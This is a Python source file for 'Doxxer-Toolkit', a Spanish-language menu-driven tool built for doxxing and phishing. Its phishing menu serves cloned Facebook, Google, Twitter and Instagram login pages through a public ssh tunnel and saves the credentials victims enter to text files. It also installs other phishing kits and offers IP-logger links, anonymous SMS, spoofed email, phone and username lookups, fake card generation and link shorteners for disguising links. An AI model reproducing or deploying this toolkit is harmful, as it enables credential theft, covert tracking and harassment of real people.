# -*- coding: utf-8 -*-

# Doxxer-Toolkit by Euronymou5
# https://twitter.com/Euronymou51
# Discord: Euronymou5#3155
# LICENSE: MPL-2.0 license

import os
import time
import subprocess
import random
import platform
import pyshorteners
import requests
import pyqrcode
import png
from faker import Faker
from modules import numeros, phoneinf
import webbrowser

Version = "2.6"

class Colores:
  red="\033[31;1m"
  verde="\033[92m"
  azul="\033[94m"
  magenta="\033[36m"
  amarillo="\033[33m"
  

os.system("killall php")
os.system("clear")
logo = Colores.red + '''
·▄▄▄▄        ▐▄• ▄ ▐▄• ▄ ▄▄▄ .▄▄▄      ▄▄▄▄▄            ▄▄▌  ▄ •▄ ▪  ▄▄▄▄▄
██▪ ██ ▪      █▌█▌▪ █▌█▌▪▀▄.▀·▀▄ █·    •██  ▪     ▪     ██•  █▌▄▌▪██ •██  
▐█· ▐█▌ ▄█▀▄  ·██·  ·██· ▐▀▀▪▄▐▀▀▄      ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▐▀▀▄·▐█· ▐█.▪
██. ██ ▐█▌.▐▌▪▐█·█▌▪▐█·█▌▐█▄▄▌▐█•█▌     ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█.█▌▐█▌ ▐█▌·
▀▀▀▀▀•  ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀ ▀▀▀ .▀  ▀     ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ ·▀  ▀▀▀▀ ▀▀▀ 
                   
                    By:  Euronymou5
                    _______________

                     Version: v2.6
                     _____________
'''



def sher():
  os.system("clear")
  print(logo)
  print('\n[1] Busqueda con Doxxer Toolkit')
  print('[2] Sherlock (Programa)')
  print('[3] Nexfil (Programa)')
  print('[4] Busqueda basica con socialscan')
  print('[00] Regresar al menu principal')
  print('[99] Salir')
  var = int(input('\n>> '))
  if var == 1:
     os.system("python3 modules/search.py")
  elif var == 2:
     if os.path.exists('.tools/sherlock'):
        user = input('\n[~] Ingresa el nombre de usuario a buscar en sherlock: ')
        print(' ')
        os.system(f"cd .tools/sherlock && python3 sherlock {user}")
     else:
       print('\n[!] Sherlock no esta instalado!')
       var = input('[?] Deseas instalar sherlock [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando sherlock...')
          os.system("cd .tools && git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip3 install -r requirements.txt")
          print('[~] Sherlock instalado.')
          time.sleep(2)
          sher()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           sher()
  elif var == 3:
     if os.path.exists('.tools/nexfil'):
        user = input('\n[~] Ingresa el nombre de usuario a buscar en nexfil: ')
        print(' ')
        os.system(f"cd .tools/nexfil && python3 nexfil.py -u {user}")
     else:
       print('\n[!] Nexfil no esta instalado!')
       var = input('[?] Deseas instalar nexfil [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando nexfil...')
          os.system("cd .tools && git clone https://github.com/thewhiteh4t/nexfil && cd nexfil && pip3 install -r requirements.txt")
          print('[~] Nexfil instalado.')
          time.sleep(2)
          sher()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           sher()
  elif var == 4:
     user = input('\n[~] Ingresa un usuario a buscar: ')
     os.system(f"socialscan {user} --show-urls")
  elif var == 00:
     menu()
  elif var == 99:
     exit()
  else:
    print('\n[!] Error opcion invalida.')
    sher()

def iplog():
  os.system("clear")
  print(logo)
  print('\n[~] Ingresa una opcion.')
  print('''\n
  [1] IPlogger.org
  
  [2] Grabify
  
  [3] Crear un link IPlogger 
  
  [00] Regresar al menu principal
  
  [99] Salir
  ''')
  opc = int(input('>> '))
  if opc == 1:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu anterior')
    print('\n[99] Salir')
    Skd = int(input('>> '))
    if Skd == 1:
      webbrowser.open('https://iplogger.org/es/')
      iplog()
    elif Skd == 2:
      os.system("termux-open https://iplogger.org/es/")
      iplog()
    elif Skd == 00:
      iplog()
    elif Skd == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      iplog()
  elif opc == 2:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    LA = int(input('>> '))
    if LA == 1:
      webbrowser.open('https://grabify.link/')
      iplog()
    elif LA == 2:
      os.system("termux-open https://grabify.link/")
      iplog()
    elif LA == 00:
      iplog()
    elif LA == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      iplog()
  elif opc == 3:
    os.system("python3 modules/iplogger.py")
  elif opc == 00:
    os.system("clear")
    menu()
  elif opc == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    iplog()
  
def fakerr():
  print(f'''{Colores.red}\n
  [1] Generar ipv4 Falsa
  
  [2] Generar numero de telefono falso
  
  [3] Generar Perfil de una persona falsa
  
  [4] Generar User-agents falsos

  [5] Generar tarjeta de credito falsa
    
  [00] Regresar al menu principal
  
  [99] Salir
  ''')
  fakk = int(input('>> '))
  if fakk == 1:
    print('\n[~] Generando una IPv4 falsa...')
    time.sleep(2)
    ip = ".".join(map(str, (random.randint(0, 255)
                            for _ in range(4))))
    print(f'{Colores.verde}[~] IP falsa generada: {ip}') 
    fakerr()
  elif fakk == 2:
    fake = Faker()
    Faker.seed(0)
    print('[~] Cuantas veces quieres generar un numero falso?')
    num = int(input('[~] Escribe un numero: '))
    print('[~] Generando numero de telefono falso...')
    time.sleep(1)
    for _ in range(num):
      print(fake.phone_number())
    fakerr()
  elif fakk == 3:
    fake = Faker()
    Faker.seed(0)
    print('[~] Cuantas veces quieres generar un perfil falso?')
    num = int(input('[~] Escribe un numero: '))
    print('[~] Generando un perfil falso...')
    time.sleep(1)
    for _ in range(num):
      print(fake.profile())
    fakerr()
  elif fakk == 4:
    fake = Faker()
    Faker.seed(0)
    print('[~] Cuantas veces quieres generar un user-agent?')
    num = int(input('[~] Escribe un numero: '))
    print('[~] Generando un user agent falso...')
    time.sleep(1)
    for _ in range(num):
      print(fake.user_agent())
    fakerr()
  elif fakk == 5:
    fake = Faker()
    Faker.seed(0)
    print('[~] Cuantas veces quieres generar una terjeta de credito?')
    num = int(input('[~] Escribe un numero: '))
    print('[~] Generando una tarjeta de credito falsa...')
    time.sleep(1)
    for _ in range(num):
      print(fake.credit_card_full())
    fakerr()
  elif fakk == 00:
    os.system("clear")
    menu()
  elif fakk == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    fakerr()

def geoip():
  print('\n[1] Geolocalizar IP')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  MC = int(input('\n>> '))
  if MC == 1:
        os.system(f"cd .geo && python3 geo.py")
  elif MC == 00:
    menu()
  elif MC == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    geoip()
    

def emailfak():
  os.system("clear")
  print(logo)
  print('\n[~] Ingresa una opcion')
  print('\n[1] Emkei')
  print('\n[2] Anonemail (Anonymouse)')
  print('\n[3] Temp-Mail')
  print('\n[4] Etemp-Mail')
  print('\n[5] TempMail.email')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  OP = int(input('>> '))
  # ------------ Emkei ---------------
  if OP == 1:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://emkei.cz/')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://emkei.cz/")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Anonymouse ---------------
  elif OP == 2:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('http://anonymouse.org/anonemail.html')
      emailfak()
    elif bruh == 2:
      os.system("termux-open http://anonymouse.org/anonemail.html")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Temp-mail ---------------
  elif OP == 3:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://temp-mail.org/es/')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://temp-mail.org/es/")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Etemp-Mail ---------------
  elif OP == 4:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://etempmail.com')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://etempmail.com")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # TempMail-Email
  elif OP == 5:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://tempmail.email')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://tempmail.email")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # Devolver
  elif OP == 00:
    menu()
  elif OP == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    emailfak()
  
def phishing():
  os.system("clear")
  print(logo)
  print('[1] Usar el phishing de Doxxer Toolkit')
  print('[2] Zphisher (Programa)')
  print('[3] 0ni-Phish (Programa)')
  print('[4] MaxPhisher (Programa)')
  print('[00] Regresar al menu principal')
  print('[99] Salir')
  var = int(input('\n>> '))
  if var == 1:
     print('''
     [~] Selecciona un lenguaje de la pagina a usar:
     
     [1] Español
     
     [2] Ingles
     ''')
     lengua = int(input('\n>> '))
     if lengua == 1:
       print('''
       [1] Facebook
  
       [2] Google
    
       [3] Twitter
  
       [4] Instagram (Pagina desactualizada)
  
       [00] Regresar al menu principal
  
       [99] Salir
       ''')
       YP = int(input('>> '))
       if YP == 1:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Facebook/usuarios.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 2:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Google/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Google/usuarios.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Google -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 3:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Twitter/usuarios.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 4:
        print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
        print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/Instagram/usuarios.txt')
        print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
        print(' ')
        cmd = "php -t .pages/Instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
        p = subprocess.Popen(cmd, shell=True)
        a = p.communicate()[0]
       elif YP == 00:
        menu()
       elif YP == 99:
        exit()
     elif lengua == 2:
       print('''
       [1] Facebook
  
       [2] Google
    
       [3] Twitter
  
       [4] Instagram
  
       [00] Regresar al menu principal
  
       [99] Salir
       ''')
       YP = int(input('>> '))
       if YP == 1:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/facebook/usernames.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 2:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/google_new/usernames.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/google_new -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 3:
         print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/twitter/usernames.txt')
         print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 4:
        print(f'\n{Colores.azul}[~] Los usuarios se guardaran en: Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
        print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat Doxxer-Toolkit/.pages/en_pages/instagram/usernames.txt')
        print(f'\n{Colores.magenta}[~] Para salir presiona CTRL + C')
        print(' ')
        cmd = "php -t .pages/en_pages/instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
        p = subprocess.Popen(cmd, shell=True)
        a = p.communicate()[0]
       elif YP == 00:
        menu()
       elif YP == 99:
        exit()    
  elif var == 2:
     if os.path.exists('.tools/zphisher'):
        os.system("cd .tools && cd zphisher && bash zphisher.sh")
     else:
       print('\n[!] Zphisher no esta instalado!')
       var = input('[?] Deseas instalar zphisher [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando zphisher...')
          os.system("cd .tools && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh")
          print('[~] Zphisher instalado.')
          time.sleep(1)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  elif var == 3:
     if os.path.exists('.tools/0ni-Phish'):
        os.system(f"cd .tools/0ni-Phish && python3 0ni.py")
     else:
       print('\n[!] 0ni-Phish no esta instalado!')
       var = input('[?] Deseas instalar 0ni-Phish [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando 0ni-Phish...')
          os.system("cd .tools && git clone https://github.com/Euronymou5/0ni-Phish")
          print('[~] 0ni-Phish instalado.')
          time.sleep(2)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  # MaxPhisher
  elif var == 4:
     if os.path.exists('.tools/MaxPhisher'):
        os.system(f"cd .tools/MaxPhisher && python3 maxphisher.py")
     else:
       print('\n[!] MaxPhisher no esta instalado!')
       var = input('[?] Deseas instalar MaxPhisher [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando MaxPhisher...')
          os.system("cd .tools && git clone https://github.com/KasRoudra/MaxPhisher && pip3 install -r MaxPhisher/files/requirements.txt")
          print(Colores.verde + '\n[~] MaxPhisher instalado.')
          time.sleep(2)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  ##  return
  elif var == 00:
     menu()
  elif var == 99:
    exit()
  
def sms():
  print('\n[1] Enviar un sms anonimo utilizando TextBelt')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  YR = int(input('>> '))
  if YR ==  1:
      print('[~] Ejemplo: +14322009740')
      print(f'\n{Colores.azul}[!] Recuerda que solo puedes enviar 1 mensaje por dia')
      numero = input(f'{Colores.red}[~] Ingresa el numero de telefono: ')
      mess = input('[~] Ingresa el mensaje que quieres enviar: ')
      resp = requests.post('https://textbelt.com/text', {
           'phone': f'{numero}',
           'message': f'{mess}',
           'key': 'textbelt',
      })
      print(resp.json())
      print('[~] Mensaje enviado.')
      input('[~] Presiona enter para continuar...')
      os.system("clear")
      print(logo)
      sms()
  elif YR == 00:
    menu()
  elif YR == 99:
    exit()
    
def numero():
    print('\n[1] RevealName (Pagina)')
    print('[2] Obtener informacion utilizando Numverify (API)')
    print('[3] Obtener informacion utilizando el modulo Phonenumbers')
    print('[4] Phoneinfoga (Herramienta)')
    print('[00] Regresar al menu principal')
    print('[99] Salir')
    var = int(input('\n>> '))
    if var == 1:
       print('\n[1] Abrir link para linux')
       print('[2] Abrir link para termux')
       var2 = int(input('>> '))
       if var2 == 1:
          webbrowser.open('https://www.revealname.com/')
          numero()
       elif var2 == 2:
           os.system("termux-open https://www.revealname.com/")
           numero()
    elif var == 2:
        numeros.inicio()
    elif var == 3:
       print('\n[~] Ejemplo: +19087654321')
       phone_number = str(input('[~] Ingresa el numero de telefono: '))
       try:
           import phonenumbers
           from phonenumbers import geocoder, carrier, timezone

           phone = phonenumbers.parse(phone_number)
           international = phonenumbers.format_number(phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
           countrycode = international.split(' ')[0]
           country = geocoder.country_name_for_number(phone, 'en')
           location = geocoder.description_for_number(phone, 'en')
           carrierr = carrier.name_for_number(phone, 'en')
           print(f'\n[~] Formato internacional : {international}')
           print(f'[~] Nombre del país    : {country} ({countrycode})')
           print(f'[~] Ciudad / Provincia : {location}')
           print(f'[~] Transportador    : {carrierr}')
           for time in timezone.time_zones_for_number(phone):
                    print(f'[~] Zona horaria   : {time}')
                    print('\n[~] Escaneo completo.')
       except ImportError:
            print(f'\n{Colores.azul}[!] Modulo phonenumbers no encontrado!')
            print('[~] Utiliza el comando pip3 install phonenumbers')
            time.sleep(2)
            print(f'{Colores.red}[~] Regresando al menu principal...')
            time.sleep(1)
            numero()
    elif var == 4:
        phoneinf.install()
    elif var == 00:
      menu()
    elif var == 99:
      exit()


def osintpa():
  os.system("clear")
  print(logo)
  print('''\n
  [1] Osintframework
  
  [2] Osint Techniques

  [3] Awesome Osint
  
  [00] Regresar al menu principal
  
  [99] Salir
  ''')
  osint = int(input('>> '))
  if osint == 1:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>> '))
    if elejir99 == 1:
      webbrowser.open('https://osintframework.com/')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://osintframework.com/")
      osintpa()
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 2:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>>: '))
    if elejir99 == 1:
      webbrowser.open('https://www.osinttechniques.com/')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://www.osinttechniques.com/")
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 3:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>>: '))
    if elejir99 == 1:
      webbrowser.open('https://github.com/jivoi/awesome-osint')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://github.com/jivoi/awesome-osint")
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 00:
    menu()
  elif osint == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    osintpa()

def qrcodigo():
  os.system("clear")
  print(logo)
  print('\n[~] Ingresa un texto o url para convertir a codigo qr')
  s = input('[~] Ingresa un texto: ')
  n = input('[~] Ingresa el nombre de la imagen: ')
  d=n+".png"
  url=pyqrcode.create(s)
  url.show()
  url.png(d, scale =40)
  print(f'{Colores.azul}[~] Imagen guardada en la carpeta de Doxxer-Toolkit con el nombre: {n}.png')
  ll = input(f'{Colores.red}[~] Quieres regresar al menu principal? [Y/n]: ')
  if ll == "Y" or ll == "y":
    menu()
  elif ll == "N" or ll == "n":
    print('[~] Saliendo el programa...')
    time.sleep(1)
    exit()
  else:
    print('[!] Error')
    time.sleep(2)
    qrcodigo()

def cortarlink():
  os.system("clear")
  print(logo)
  print(' ')
  print('\n[1] Cutt.ly (Requiere API Key)')
  print('\n[2] Shorturl')
  print('\n[3] n9.cl')
  print('\n[4] xurl.es')
  print('\n[5] TinyURL (API)')
  print('\n[6] Chilp.it')
  print('\n[7] Clck.ru')
  print('\n[8] Da.gd')
  print('\n[9] Is.gd')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  cortarel = int(input('>> '))
  if cortarel == 1:
    print('[~] Si no tienes una API Key de Cuttly tienes que crear una cuenta')
    print('[~] Link de cuttly para acortar: https://cutt.ly/es')
    key = input('[~] Ingresa tu API key de Cuttly: ')
    s = pyshorteners.Shortener(api_key=key)
    url1 = input('[~] Link: ')
    print(f'{Colores.azul} Link acortado:', s.cuttly.short(url1))
  elif cortarel == 2:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    shorurl = int(input('>> '))
    if shorurl == 1:
      webbrowser.open('https://shorturl.com/')
      cortarlink()
    elif shorurl == 2:
      os.system("termux-open https://shorturl.com/")
    elif shorurl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif shorurl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 3:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    ncl = int(input('>> '))
    if ncl == 1:
      webbrowser.open('https://n9.cl/es')
      cortarlink()
    elif ncl == 2:
      os.system("termux-open https://n9.cl/es")
    elif ncl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif ncl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 4:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    xurl = int(input('>> '))
    if xurl == 1:
      webbrowser.open('https://www.xurl.es/')
      cortarlink()
    elif xurl == 2:
      os.system("termux-open https://www.xurl.es/")
    elif xurl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif xurl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 5:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.azul}[~] Link acortado:', s.tinyurl.short(url))
    time.sleep(2)
  elif cortarel == 6:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.azul}[~] Link acortado:', s.chilpit.short(url))
  elif cortarel == 7:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.azul}[~] Link acortado:', s.clckru.short(url))
  elif cortarel == 8:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.azul}[~] Link acortado:', s.dagd.short(url))
  elif cortarel == 9:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.azul}[~] Link acortado:', s.isgd.short(url))
  elif cortarel == 00:
    menu()
  elif cortarel == 99:
    exit()

def menu():
    os.system("clear")
    print(logo)
    print(Colores.red + '''
    [~] Bienvenido a Doxxer Toolkit!
                      
    [1] IPloggers      
    [2] Geolocalizar IP             
    [3] Obtener informacion de un numero
    [4] Phishing       
    [5] SMS                        
    [6] Correos Electronicos anonimos    
    [7] Buscar usuario 
    [8] Generar informacion falsa
    [9] Paginas OSINT
    [10] Acortadores de links
    [11] Generar codigo QR
    [12] OSINT Email (BETA)

    [98] Update checker
    [99] Salir
    ''')
    elejir = int(input('\n>> '))
    if elejir == 1:
      iplog()
    elif elejir == 2:
      geoip()
    elif elejir == 3:
      numero()
    elif elejir == 4:
      phishing()
    elif elejir == 5:
      sms()
    elif elejir == 6:
      emailfak()
    elif elejir == 7:
      sher()
    elif elejir == 8:
      fakerr()
    elif elejir == 9:
      osintpa()
    elif elejir == 10:
      cortarlink()
    elif elejir == 11:
      qrcodigo()
    elif elejir == 12:
       os.system("python3 modules/emails.py")
    elif elejir == 98:
        version = requests.get('https://raw.githubusercontent.com/Euronymou5/Doxxer-Toolkit/main/version.txt')
        if version.status_code == 200:
            c = version.text
            ola = c.strip()
            if Version == ola:
                print(f'\n{Colores.verde}[~] No hay versiones disponibles.')
                m = input(f'\n{Colores.red}[~] Presiona enter para continuar...')
                menu()
            else:
                print(f'\n{Colores.verde}[~] Hay una nueva version disponible: {ola}')
                m = input(f'\n{Colores.red}[~] Presiona enter para continuar...')
                menu()
    elif elejir == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      menu()
    

if __name__ == "__main__":
    menu()
